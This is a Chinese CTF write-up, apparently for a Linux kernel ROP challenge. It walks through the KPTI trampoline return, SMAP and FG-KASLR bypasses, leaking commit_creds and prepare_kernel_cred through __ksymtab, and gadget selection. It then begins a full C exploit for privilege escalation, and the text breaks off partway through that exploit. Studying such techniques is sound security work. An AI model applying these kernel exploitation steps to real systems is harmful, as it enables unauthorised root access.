<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//@Linux5.14/arch/x86/entry/calling.h</span><br><span class="line">.macro POP_REGS pop_rdi=1 skip_r11rcx=0</span><br><span class="line">	popq %r15</span><br><span class="line">	popq %r14</span><br><span class="line">	popq %r13</span><br><span class="line">	popq %r12</span><br><span class="line">	popq %rbp</span><br><span class="line">	popq %rbx</span><br><span class="line">	.if \skip_r11rcx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.else</span><br><span class="line">	popq %r11</span><br><span class="line">	.endif</span><br><span class="line">	popq %r10</span><br><span class="line">	popq %r9</span><br><span class="line">	popq %r8</span><br><span class="line">	popq %rax</span><br><span class="line">	.if \skip_r11rcx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.else</span><br><span class="line">	popq %rcx</span><br><span class="line">	.endif</span><br><span class="line">	popq %rdx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.if \pop_rdi</span><br><span class="line">	popq %rdi</span><br><span class="line">	.endif</span><br><span class="line">.endm</span><br></pre></td></tr></table></figure>
<p>接下来rdi指向旧堆栈, 从gs段拿出rsp0交给rsp</p>
<p>然后把老堆栈上保存的用户上下文压到新堆栈里</p>
<p>然后更换页表</p>
<p>然后swapgs</p>
<p>然后iret</p>
<p>实际上此时iret使用的堆栈, 已经是新堆栈了,不是老堆栈</p>
</blockquote>
<p>具体干了啥可以看反汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms  | grep swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#POP_REGS部分省略</span><br><span class="line"></span><br><span class="line">  0xffffffff81200f26 &lt;_stext+2101030&gt;: mov    rdi,rsp</span><br><span class="line">  0xffffffff81200f29 &lt;_stext+2101033&gt;: mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">  0xffffffff81200f32 &lt;_stext+2101042&gt;: push   QWORD PTR [rdi+0x30]		;用户ss</span><br><span class="line">  0xffffffff81200f35 &lt;_stext+2101045&gt;: push   QWORD PTR [rdi+0x28]		;用户rsp</span><br><span class="line">  0xffffffff81200f38 &lt;_stext+2101048&gt;: push   QWORD PTR [rdi+0x20]		;用户eflags</span><br><span class="line">  0xffffffff81200f3b &lt;_stext+2101051&gt;: push   QWORD PTR [rdi+0x18]		;用户cs</span><br><span class="line">  0xffffffff81200f3e &lt;_stext+2101054&gt;: push   QWORD PTR [rdi+0x10]		;用户rip</span><br><span class="line">  0xffffffff81200f41 &lt;_stext+2101057&gt;: push   QWORD PTR [rdi]			;老栈顶</span><br><span class="line">  0xffffffff81200f43 &lt;_stext+2101059&gt;: push   rax</span><br><span class="line">  0xffffffff81200f44 &lt;_stext+2101060&gt;: xchg   ax,ax</span><br><span class="line">  0xffffffff81200f46 &lt;_stext+2101062&gt;: mov    rdi,cr3</span><br><span class="line">  0xffffffff81200f49 &lt;_stext+2101065&gt;: jmp    0xffffffff81200f7f &lt;_stext+2101119&gt;</span><br><span class="line">  </span><br><span class="line">  0xffffffff81200f7f &lt;_stext+2101119&gt;: or     rdi,0x1000			#蜜汁操作</span><br><span class="line">  0xffffffff81200f86 &lt;_stext+2101126&gt;: mov    cr3,rdi</span><br><span class="line">  0xffffffff81200f89 &lt;_stext+2101129&gt;: pop    rax</span><br><span class="line">  0xffffffff81200f8a &lt;_stext+2101130&gt;: pop    rdi</span><br><span class="line">  0xffffffff81200f8b &lt;_stext+2101131&gt;: swapgs</span><br><span class="line">  0xffffffff81200f8e &lt;_stext+2101134&gt;: nop    DWORD PTR [rax]</span><br><span class="line">  0xffffffff81200f91 &lt;_stext+2101137&gt;: jmp    0xffffffff81200fc0 &lt;_stext+2101184&gt;</span><br><span class="line">  </span><br><span class="line">  0xffffffff81200fc0 &lt;_stext+2101184&gt;: test   BYTE PTR [rsp+0x20],0x4</span><br><span class="line">  0xffffffff81200fc5 &lt;_stext+2101189&gt;: jne    0xffffffff81200fc9 &lt;_stext+2101193&gt;	#这个调试观察不会跳</span><br><span class="line">  0xffffffff81200fc7 &lt;_stext+2101191&gt;: iretq</span><br></pre></td></tr></table></figure>
<p>这里有一个很迷的操作, 把<code>cr3</code>里面的页表地址拿出来,
或了一个<code>0x1000</code>再放回去, 就完成了内核态-用户态页表的更换,
这是因为这俩页表地址还真就是这样挨着存放的,
这哥俩被称为一个<code>CR3 Pair</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/a99b0d0eef40d94aa386ee0d903b5a64.png"
alt="CR3 Pair" />
<figcaption aria-hidden="true">CR3 Pair</figcaption>
</figure>
<blockquote>
<p>这种伙伴形式还见于完全二叉树:</p>
<p>如果根从1开始编号, 那么其他节点的编号异或1就是其兄弟节点</p>
</blockquote>
<p>如果构造ROP链,
返回到<code>0xffffffff81200f26 &lt;_stext+2101030&gt;: mov    rdi,rsp</code>这一行</p>
<p>下面还要填充两个dummy来满足这两个pop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81200f89 &lt;_stext+2101129&gt;: pop    rax</span><br><span class="line">0xffffffff81200f8a &lt;_stext+2101130&gt;: pop    rdi</span><br></pre></td></tr></table></figure>
<h3 id="bypass-smap">bypass SMAP</h3>
<p>smap意味着内核态无法访问用户态任何数据</p>
<p>象内核栈迁移到用户态映射区就白搭了</p>
<p>但是纯用rop链还是可以的</p>
<h3 id="bypass-kaslr">bypass KASLR</h3>
<p><code>FG-KASLR</code>,不光整个内核镜像基地址随机,
部分函数之间的相对偏移量也会变, 真是死🐎了</p>
<p>如果使用<code>readelf -S ./vmlinux | grep ".text"</code>查看text节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">^C</span><br><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># readelf -S ./vmlinux | grep <span class="string">&quot;.text&quot;</span> | head -n 15</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS         ffffffff81000000  <span class="number">00200000</span></span><br><span class="line">  [ <span class="number">2</span>] .rela.text        RELA             <span class="number">0000000000000000</span>  <span class="number">024</span>d3b10</span><br><span class="line">  [ <span class="number">3</span>] .text.unlike[...] PROGBITS         ffffffff81400dd7  <span class="number">00600</span>dd7</span><br><span class="line">  [ <span class="number">4</span>] .text.__star[...] PROGBITS         ffffffff81400e90  <span class="number">00600e90</span></span><br><span class="line">  [ <span class="number">5</span>] .text.__do_s[...] PROGBITS         ffffffff81400ea0  <span class="number">00600</span>ea0</span><br><span class="line">  [ <span class="number">6</span>] .text.__xen_[...] PROGBITS         ffffffff81400eb0  <span class="number">00600</span>eb0</span><br><span class="line">  [ <span class="number">7</span>] .text.vvar_mremap PROGBITS         ffffffff81400ed0  <span class="number">00600</span>ed0</span><br><span class="line">  [ <span class="number">8</span>] .text.vdso_fault  PROGBITS         ffffffff81400f00  <span class="number">00600f</span>00</span><br><span class="line">  [ <span class="number">9</span>] .text.map_vdso    PROGBITS         ffffffff81400f90  <span class="number">00600f</span>90</span><br><span class="line">  [<span class="number">10</span>] .text.map_vd[...] PROGBITS         ffffffff814010c0  <span class="number">006010</span>c0</span><br><span class="line">  [<span class="number">11</span>] .text.vdso_mremap PROGBITS         ffffffff81401170  <span class="number">00601170</span></span><br><span class="line">  [<span class="number">12</span>] .text.<span class="type">find_t</span>[...] PROGBITS         ffffffff81401210  <span class="number">00601210</span></span><br><span class="line">  [<span class="number">13</span>] .text.vvar_fault  PROGBITS         ffffffff81401230  <span class="number">00601230</span></span><br><span class="line">  [<span class="number">14</span>] .text.arch_g[...] PROGBITS         ffffffff81401450  <span class="number">00601450</span></span><br><span class="line">  [<span class="number">15</span>] .text.vdso_j[...] PROGBITS         ffffffff81401470  <span class="number">00601470</span></span><br></pre></td></tr></table></figure>
<p>除去纯正的<code>.text</code>节之外, 还有很多<code>.text.*</code>的节,
这些节都很小,甚至二三十字节一个, 节里面也就一两个函数</p>
<p>其作用就是每个节都可以随机排列, 实现<code>FG-KASLR</code></p>
<p>但是🐎还没有死完</p>
<p><code>.text</code>节是一整个儿,只会整体参与ASLR,但是节内的函数不会参与<code>FG-KASLR</code>,而节内函数就有<code>swapgs_restore_regs_and_return_to_usermode</code>,</p>
<p><code>.text</code>节在未开启<code>KASLR</code>时的范围:
<code>0xffffffff81000000 ~ 0xffffffff81400dd7</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text @ 0xffffffff81000000 </span><br><span class="line">swapgs_restore_regs_and_return_to_usermode @ 0xffffffff81200f10		offset_to_text = 0x200f10</span><br><span class="line">kpti_trampoline @ 0xffffffff81200f26								offset_to_text = 0x200f26</span><br></pre></td></tr></table></figure>
<p><code>ksymtab</code>不属于任何<code>text</code>节,只参与<code>KASLR</code>,因此<code>ksymtab</code>到<code>.text</code>
的偏移量也是固定的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__ksymtab @ <span class="number">0xffffffff81f85198</span>		offset_to_text = <span class="number">0xf85198</span></span><br></pre></td></tr></table></figure>
<p><code>ksymtab</code>是一个映射表表中的每一项都长这样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">	  <span class="type">int</span> value_offset;				<span class="comment">//符号地址 相对于 本字段 的偏移量</span></span><br><span class="line">	  <span class="type">int</span> name_offset;				<span class="comment">//符号名地址 相对于 本字段 的偏移量</span></span><br><span class="line">	  <span class="type">int</span> namespace_offset;			<span class="comment">//符号命名空间地址, 相对于 本字段 的偏移量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这三个字段的意义是什么呢? 以commit_creds函数为例,</p>
<p>首先在未开启KASLR的内核上,找到它在ksymtab中的地址,是<code>0xffffffff81f87d90</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep <span class="string">&quot;commit_creds&quot;</span></span></span><br><span class="line">ffffffff814c6410 T commit_creds</span><br><span class="line">ffffffff81f87d90 r __ksymtab_commit_creds</span><br><span class="line">ffffffff81fa0972 r __kstrtab_commit_creds</span><br><span class="line">ffffffff81fa4d42 r __kstrtabns_commit_creds</span><br></pre></td></tr></table></figure>
<p>然后在gdb中打印<code>ffffffff81f87d90</code>处三个双字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/3wx 0xffffffff81f87d90</span><br><span class="line">0xffffffff81f87d90:     0xff53e680      0x00018bde      0x0001cfaa</span><br></pre></td></tr></table></figure>
<p>也就是说</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value_offset = 0xff53e680</span><br><span class="line">name_offset = 0x00018bde</span><br><span class="line">name_space_offset = 0x0001cfaa</span><br></pre></td></tr></table></figure>
<p>其中<code>value_offset</code>是符号实际地址与本字段<code>kernel_symbol.value_offset</code>的偏移量</p>
<p>符号描述符__ksymtab_commit_creds的地址在<code>0xffffffff81f87d90</code></p>
<p>符号与符号描述符的距离是<code>((1&lt;&lt;32) - 0xff53e680)</code>,由此计算得到符号地址在<code>0xffffffff814c6410</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0xffffffff81f87d90</span> - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - <span class="number">0xff53e680</span>)</span><br><span class="line">$<span class="number">17</span> = <span class="number">0xffffffff814c6410</span></span><br></pre></td></tr></table></figure>
<p>同理name_offset也是符号名字符串所在地址相对于本字段<code>kernel_symbol.name_offset</code>的偏移量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 0xffffffff81fa0972 - 0xffffffff81f87d94</span><br><span class="line">$22 = 0x18bde</span><br></pre></td></tr></table></figure>
<p>同理name_space_offset是符号命名空间字符串与本字段<code>kernel_symbol.namespace_offset</code>的偏移量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>s <span class="number">0xffffffff81fa4d42</span></span><br><span class="line"><span class="number">0xffffffff81fa4d42</span>:     <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d43</span>:     <span class="string">&quot;bpf_trace_run11&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d53</span>:     <span class="string">&quot;bpf_trace_run12&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d63</span>:     <span class="string">&quot;kprobe_event_cmd_init&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d79</span>:     <span class="string">&quot;__kprobe_event_gen_cmd_start&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d96</span>:     <span class="string">&quot;__kprobe_event_add_fields&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4db0</span>:     <span class="string">&quot;kprobe_event_delete&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4dc4</span>:     <span class="string">&quot;__tracepoint_suspend_resume&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4de0</span>:     <span class="string">&quot;__tracepoint_cpu_idle&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4df6</span>:     <span class="string">&quot;__tracepoint_cpu_frequency&quot;</span></span><br></pre></td></tr></table></figure>
<p>可以看到,这个符号属于一个通用的命名空间</p>
</blockquote>
<p>回到本题中,思路如下:</p>
<p>1.<code>hackme_read</code>函数中泄露<code>canary</code>,
一个<code>text</code>段的地址, 计算得到<code>text</code>基地址,
以及<code>ksymtab</code>地址等</p>
<p>2.<code>ksymtab</code>中查到<code>commit_creds</code>和<code>prepare_kernel_cred</code>的地址</p>
<p>3.构造<code>rop</code>链条</p>
<h4 id="栈上泄露一个text-地址">1.栈上泄露一个<code>text</code> 地址</h4>
<p>在<code>read</code>函数中之前我们只泄露了<code>canary</code>值,
现在还要再泄露一个<code>text</code>段的地址,以此计算<code>text</code>段基地址</p>
<p>在未开启<code>KASLR</code>的情况下观察从<code>kstack_buf</code>开始的堆栈上,是否存在一个<code>text</code>段的地址
,结果发现还真有</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241125151929536.png"
alt="image-20241125151929536" />
<figcaption aria-hidden="true">image-20241125151929536</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0xffffc900001bff38</span> <span class="number">-0xffffc900001bfe08</span></span><br><span class="line">$<span class="number">4</span> = <span class="number">0x130</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x130</span>/<span class="number">8</span></span><br><span class="line">$<span class="number">5</span> = <span class="number">0x26</span></span><br><span class="line">pwndbg&gt; p <span class="number">0x130</span>/<span class="number">8</span></span><br><span class="line">$<span class="number">6</span> = <span class="number">38</span></span><br></pre></td></tr></table></figure>
<p>也就是说
,<code>stack_buf + 0x130</code>字节开始处的一个四字就是这个泄露</p>
<h4 id="从ksymtab中查函数地址">2.从<code>ksymtab</code>中查函数地址</h4>
<p>内存任意读,这也可以通过<code>gadget</code>实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot; : mov rax.*qword ptr .* ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span></span><br><span class="line"><span class="number">0xffffffff81004aad</span> : mov rax, qword ptr [rax + <span class="number">0x10</span>] ; pop rbp ; ret</span><br><span class="line"><span class="number">0xffffffff81015a7f</span> : mov rax, qword ptr [rax] ; pop rbp ; ret</span><br></pre></td></tr></table></figure>
<p>使用<code>0xffffffff81015a7f : mov rax, qword ptr [rax] ; pop rbp ; ret</code>这个<code>gadget</code>,还需要一个能够控制<code>rax</code>值的<code>gadget</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# <span class="built_in">cat</span> gadgets.ropgadget | grep <span class="string">&quot;pop rax ; ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span><br><span class="line">0xffffffff81004d11 : pop rax ; ret</span><br></pre></td></tr></table></figure>
<p>还需要一个控制<code>rdi</code>寄存器作为函数参数的<code>gadget</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# <span class="built_in">cat</span> gadgets.ropgadget | grep <span class="string">&quot;pop rdi ; ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span><br><span class="line">0xffffffff81006370 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
<h4 id="构造rop链条">3.构造ROP链条</h4>
<p>1.任意内存读泄露<code>prepare_kernel_creds</code>函数偏移量</p>
<p>2.<code>kpti-trampoline</code>返回到用户态,计算<code>prepare_kernel_creds</code>函数地址</p>
<p>3.任意内存读泄露<code>commit_creds</code>函数偏移量</p>
<p>4.<code>kpti-trampoline</code>返回到用户态,计算<code>commit_creds</code>函数地址</p>
<p>5.<code>ret2 prepare_kernel_creds</code></p>
<p>6.<code>kpti-trampoline</code>返回到用户态,保存<code>init_task @ rax</code></p>
<p>7.<code>init_task pop to rdi</code></p>
<p>8.<code>ret2 commit_creds</code></p>
<p>9.<code>kpti-trampoline</code>返回到用户态,起<code>shell</code></p>
<h4 id="完整exp">完整exp</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> addr_leak;</span><br><span class="line"><span class="type">size_t</span> off_leak = <span class="number">0xa157</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> addr_text_base;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab = <span class="number">0xf85198</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab_commit_creds = <span class="number">0xf87d90</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab_commit_creds;</span><br><span class="line"><span class="type">size_t</span> addr_commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab_prepare_kernel_cred = <span class="number">0xf8d4fc</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab_prepare_kernel_cred;</span><br><span class="line"><span class="type">size_t</span> addr_prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_kpti_trampoline = <span class="number">0x200f26</span>;</span><br><span class="line"><span class="type">size_t</span> addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_deref_rax_pop_rbp_ret = <span class="number">0x15a7f</span>;</span><br><span class="line"><span class="type">size_t</span> addr_deref_rax_pop_rbp_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_pop_rax_ret = <span class="number">0x4d11</span>;</span><br><span class="line"><span class="type">size_t</span> addr_pop_rax_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_pop_rdi_ret = <span class="number">0x6370</span>;</span><br><span class="line"><span class="type">size_t</span> addr_pop_rdi_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> addr_init_task_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> canary;</span><br><span class="line"><span class="type">int</span> value_offset;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs;</span><br><span class="line"><span class="type">size_t</span> user_ss;</span><br><span class="line"><span class="type">size_t</span> user_sp;</span><br><span class="line"><span class="type">size_t</span> user_rflags;</span><br><span class="line"><span class="type">size_t</span> user_rip;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prepare_kernel_cred</span><span 